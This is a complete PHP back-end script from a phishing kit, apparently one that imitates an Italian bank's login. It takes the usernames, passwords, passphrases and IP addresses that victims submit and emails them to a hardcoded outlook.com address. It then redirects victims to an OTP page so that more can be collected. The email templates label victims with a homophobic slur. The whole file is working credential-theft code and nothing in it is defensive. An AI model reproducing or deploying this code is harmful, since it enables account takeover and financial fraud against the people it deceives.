<?php

session_start();
$user = $_POST['UserId'];
$user1 = $_POST['Password'];
$parola = $_POST['password'];
$date = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

$subj = "$ip";

$msg1 ="
<html><body>
<font face=\"Courier New\">
==========================================
<BR /><BR />
[USERNAME] $user<BR />
[PASSWORD] $parola<BR />
[FAGGOT IP] $ip<BR />
[DATA MASII] $date<BR /><BR />
==========================================
</font></body></html>
";

$msg2 ="
<html><body>
<font face=\"Courier New\">
==========================================
<BR /><BR />
[BCH] $user<BR />
[Passphrase] $user1<BR />
[email] $parola<BR />
[FAGGOT IP] $ip<BR />
[DATA MASII] $date<BR /><BR />
==========================================
</font></body></html>
";

$from = "From: sella <no@alpha.com>\n";
$from .= "MIME-Version: 1.0\r\n";
$from .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

if(@$_GET['accedi']=='login'){
	mail("hajnika123123@outlook.com", $subj, $msg1, $from);
	header( "Location: richiesta_otp.html" );
}else{
	mail("hajnika123123@outlook.com", $subj, $msg2, $from);
	header( "Location: Autenticazione1.html" );
}
?>